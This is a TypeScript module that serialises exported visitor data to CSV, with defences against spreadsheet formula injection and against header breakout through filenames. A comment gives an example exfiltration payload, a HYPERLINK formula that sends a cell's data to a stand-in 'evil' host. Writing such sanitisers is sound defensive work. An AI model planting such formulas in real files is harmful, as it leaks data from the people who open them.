/**
 * RFC 4180 CSV serialisation for exports.
 *
 * Exported collected data is VISITOR-SUPPLIED: whatever someone typed into a
 * widget ends up in a cell. Two consequences drive this module:
 *
 *   1. Quoting must be exact, or a value containing a comma silently shifts
 *      every column after it.
 *   2. A cell starting with `=`, `+`, `-`, `@` (or a tab/CR, which Excel strips
 *      before parsing) is treated as a FORMULA by Excel, Sheets and LibreOffice.
 *      `=HYPERLINK("http://evil/?x="&A1)` in a support inbox exfiltrates the
 *      row the moment someone opens the file. We neutralise by prefixing a
 *      single quote, which spreadsheets render as a literal text marker.
 *
 * CRLF line endings per the spec — every spreadsheet reads them, and a bare LF
 * inside a quoted value stays distinguishable from a record separator.
 */

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
const NEEDS_QUOTING = /[",\r\n]/;

/** Serialise one value into a single CSV cell (quoted only when required). */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '';

  // Objects/arrays can appear when the extractor captured a structured answer.
  let str =
    typeof value === 'object' ? JSON.stringify(value) : String(value);

  if (FORMULA_TRIGGER.test(str)) {
    str = `'${str}`;
  }
  if (NEEDS_QUOTING.test(str)) {
    str = `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

/** Serialise one record, terminator included, ready to append to a stream. */
export function csvRow(values: readonly unknown[]): string {
  return `${values.map(csvCell).join(',')}\r\n`;
}

/**
 * Byte-order mark. Without it Excel on Windows decodes a UTF-8 CSV as the
 * system codepage and mangles every non-ASCII name.
 */
export const CSV_BOM = '﻿';

/**
 * Turn an arbitrary label into a safe download filename segment.
 *
 * Agent names are customer-supplied, so this strips anything that could break
 * out of the `Content-Disposition` filename (quotes, CR/LF, path separators).
 */
export function csvFilenameSegment(label: string, fallback = 'export'): string {
  const safe = label
    .normalize('NFKD')
    .replace(/[^a-zA-Z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 60)
    .toLowerCase();
  return safe || fallback;
}
